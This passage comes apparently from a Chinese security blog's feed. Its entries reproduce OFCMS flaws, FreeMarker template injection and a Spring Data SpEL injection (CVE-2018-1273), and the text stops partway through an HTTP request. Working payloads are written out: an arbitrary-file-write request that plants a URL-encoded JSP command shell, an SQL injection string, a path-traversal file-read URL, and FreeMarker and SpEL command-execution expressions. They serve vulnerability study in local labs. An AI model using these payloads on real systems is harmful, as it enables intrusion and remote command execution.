class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: empty<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: cors<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><br><span class="hljs-attribute">file_name</span>=../../../test.jsp&amp;file_content=%<span class="hljs-number">3</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">40</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">61</span>%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">3</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">50</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">52</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">52</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">77</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">31</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">29</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">77</span>%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">72</span>%<span class="hljs-number">75</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">54</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">49</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">53</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">2</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>e<br></code></pre></td></tr></table></figure><p>上传成功</p><p><a href="https://imgtu.com/i/hBriff"><img src="https://z3.ax1x.com/2021/09/01/hBriff.png" alt="hBriff.png"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController</p><p>文件名和文件内容由参数file_name和file_content可控，可以写入任意文件</p><p><a href="https://imgtu.com/i/hBrA1S"><img src="https://z3.ax1x.com/2021/09/01/hBrA1S.png" alt="hBrA1S.png"></a></p><h1 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登陆后台，执行sql语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update of_cms_link <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">link_name</span>=updatexml(1,concat(0x7e,database()),0) where <span class="hljs-attribute">link_id</span>=1<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hBrm0s"><img src="https://z3.ax1x.com/2021/09/01/hBrm0s.png" alt="hBrm0s.png"></a></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateController</p><p>接收sql参数，传入update方法</p><p><a href="https://imgtu.com/i/hBrPtP"><img src="https://z3.ax1x.com/2021/09/01/hBrPtP.png" alt="hBrPtP.png"></a></p><p>经过一系列update方法，最后prepareStatement预编译执行sql语句，因为这里的sql语句是完全可控的，没有事先用<code>?</code>占位，所以预编译并没有起到防御SQL注入的作用</p><p><a href="https://imgtu.com/i/hBrE6g"><img src="https://z3.ax1x.com/2021/09/01/hBrE6g.png" alt="hBrE6g.png"></a></p><p><a href="https://imgtu.com/i/hBrVXQ"><img src="https://z3.ax1x.com/2021/09/01/hBrVXQ.png" alt="hBrVXQ.png"></a></p><p><a href="https://imgtu.com/i/hBremj"><img src="https://z3.ax1x.com/2021/09/01/hBremj.png" alt="hBremj.png"></a></p><p><a href="https://imgtu.com/i/hBrCkt"><img src="https://z3.ax1x.com/2021/09/01/hBrCkt.png" alt="hBrCkt.png"></a></p><h1 id="任意文件读取-amp-目录遍历"><a href="#任意文件读取-amp-目录遍历" class="headerlink" title="任意文件读取&amp;目录遍历"></a>任意文件读取&amp;目录遍历</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>web.xml位置</p><p><a href="https://imgtu.com/i/hBrQhV"><img src="https://z3.ax1x.com/2021/09/01/hBrQhV.png" alt="hBrQhV.png"></a></p><p>读取web.xml</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/ofcms_admin_war/</span>admin<span class="hljs-regexp">/cms/</span>template<span class="hljs-regexp">/getTemplates.html?dir=../</span>../&amp;file_name=web.xml<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hBrn7n"><img src="https://z3.ax1x.com/2021/09/01/hBrn7n.png" alt="hBrn7n.png"></a></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController</p><p><code>SystemUtile.getSiteTemplatePath()</code>返回模板文件目录，然后和可控参数<code>dir</code>拼接，造成目录穿越</p><p><a href="https://imgtu.com/i/hBrMt0"><img src="https://z3.ax1x.com/2021/09/01/hBrMt0.png" alt="hBrMt0.png"></a></p><p>此时已经穿越到指定目录，filename文件名可控，可调用<code>FileUtils.readString</code>读取目标目录下任意文件</p><p><a href="https://imgtu.com/i/hBrKkq"><img src="https://z3.ax1x.com/2021/09/01/hBrKkq.png" alt="hBrKkq.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/solitudi/article/details/117047070?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/117047070?spm=1001.2014.3001.5501</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/117048861">https://blog.csdn.net/solitudi/article/details/117048861</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/117046188?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-12.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-12.control">https://y4tacker.blog.csdn.net/article/details/117046188?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-12.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-12.control</a></p><p><a href="https://blog.csdn.net/Alexz__/article/details/116426132">https://blog.csdn.net/Alexz__/article/details/116426132</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeMarker模板注入</title>
    <link href="/2021/09/01/FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/09/01/FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="https://imgtu.com/i/hwHtTf"><img src="https://z3.ax1x.com/2021/09/01/hwHtTf.png" alt="hwHtTf.png"></a></p><p>FreeMarker模板语言（FTL）的4个组成部分：</p><ol><li>文本：原样输出</li><li>插值：输出会被模板引擎计算得到的值替换</li><li>FTL标签：与html标签类似，只是给FreeMarker的提示，不会打印在输出内容里</li><li>注释</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p>利用FreeMarker的原生函数</p><h3 id="new函数利用"><a href="#new函数利用" class="headerlink" title="new函数利用"></a>new函数利用</h3><p>new函数可以创建一个继承自<code>freemarker.template.TemplateModel</code>类的实例，实例化可用的对象来执行命令</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-literal">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;<br><br>&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-literal">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;calc.exe&quot;</span>).start()&#125;<br><br>&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-literal">new</span>()&gt;&lt;@value&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc.exe&quot;</span>)&lt;/@value&gt;<br></code></pre></td></tr></table></figure><p>freemarker.template.utility.Execute#exec</p><p>执行命令</p><p><a href="https://imgtu.com/i/hwHUk8"><img src="https://z3.ax1x.com/2021/09/01/hwHUk8.png" alt="hwHUk8.png"></a></p><h3 id="api函数利用"><a href="#api函数利用" class="headerlink" title="api函数利用"></a>api函数利用</h3><p>api函数可以用来访问Java API</p><p>通过getClassLoader获取类加载器，加载恶意类</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;#assign classLoader=object?api.<span class="hljs-keyword">class</span>.getClassLoader()&gt;<br>$&#123;classLoader.loadClass(<span class="hljs-string">&quot;Evil.class&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>getResource读取资源文件</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">&lt;#assign is=object?api.<span class="hljs-keyword">class</span>.getResourceAsStream(<span class="hljs-string">&quot;/Test.class&quot;</span>)&gt; FILE:<span class="hljs-meta">[&lt;#list 0..999999999 as _&gt; &lt;#assign byte=is.read()&gt; &lt;#if byte == -1&gt; &lt;#break&gt; &lt;/#if&gt; $&#123;byte&#125;, &lt;/#list&gt;]</span><br></code></pre></td></tr></table></figure><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>FreeMarker&gt;2.3.22</p><p>api_builtin_enabled默认false，不能使用api内建函数</p><p>还提供了3个预定义的解析器限制new函数对类的访问</p><ol><li>UNRESTRICTED_RESOLVER：简单的调用ClassUtil.forName(String)</li><li>SAFER_RESOLVER：禁止解析ObjectConstructor、Execute、freemarker.template.utility.JythonRuntime（上面三个执行命令的类）</li><li>ALLOWS_NOTHING_RESOLVER：禁止解析任何类</li></ol><h1 id="CVE-2019-9614"><a href="#CVE-2019-9614" class="headerlink" title="CVE-2019-9614"></a>CVE-2019-9614</h1><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>影响版本：OFCMS&lt;1.1.3</p><p>FreeMarker版本：2.3.21</p><p>OFCMS使用FreeMarker作为模板引擎，后台提供了修改模板文件的功能，攻击者可利用FreeMarker模板注入的方式获取权限</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台，在一个模板文件中插入payload，这里用contact.html</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hwHY0P"><img src="https://z3.ax1x.com/2021/09/01/hwHY0P.png" alt="hwHY0P.png"></a></p><p>访问对应页面，触发模板解析，执行命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/ofcms_admin_war/</span>contact.html<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hwHatS"><img src="https://z3.ax1x.com/2021/09/01/hwHatS.png" alt="hwHatS.png"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController</p><p>save方法先获取模板文件路径，然后将未过滤的数据保存入模板文件，导致攻击者将可执行系统命令的代码存入FreeMarker模板</p><p><a href="https://imgtu.com/i/hwHdfg"><img src="https://z3.ax1x.com/2021/09/01/hwHdfg.png" alt="hwHdfg.png"></a></p><p>对应的模板文件目录</p><p><a href="https://imgtu.com/i/hwHJmt"><img src="https://z3.ax1x.com/2021/09/01/hwHJmt.png" alt="hwHJmt.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</a></p><p><a href="https://blog.csdn.net/Alexz__/article/details/116426132">https://blog.csdn.net/Alexz__/article/details/116426132</a></p><p><a href="http://lanbainan.cn/2020/05/20/2020-05-20/">http://lanbainan.cn/2020/05/20/2020-05-20/</a></p><p><a href="https://blog.csdn.net/Alexz__/article/details/116400913">https://blog.csdn.net/Alexz__/article/details/116400913</a></p><p><a href="http://cn-sec.com/archives/232669.html">http://cn-sec.com/archives/232669.html</a></p><p><a href="https://xz.aliyun.com/t/4846">https://xz.aliyun.com/t/4846</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-1273复现</title>
    <link href="/2021/08/31/CVE-2018-1273%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/08/31/CVE-2018-1273%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h1><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。</p><p>Spring Data Commons是Spring Data下所有子项目共享的基础框架。</p><p>Spring Data Commons在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用vulhub上的环境</p><p><a href="https://imgtu.com/i/hddaQI"><img src="https://z3.ax1x.com/2021/08/31/hddaQI.png" alt="hddaQI.png"></a></p><p>运行成功</p><p><a href="https://imgtu.com/i/hddBef"><img src="https://z3.ax1x.com/2021/08/31/hddBef.png" alt="hddBef.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">username[#this.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRu<span class="hljs-meta">ntime(</span>).exec(<span class="hljs-string">&quot;touch /tmp/test&quot;</span>)]=<span class="hljs-variable">&amp;password</span>=<span class="hljs-variable">&amp;repeatedPassword</span>=<br></code></pre></td></tr></table></figure><p>POST数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /users?page=&amp;size=<span class="hljs-number">5</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.111.133:8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span 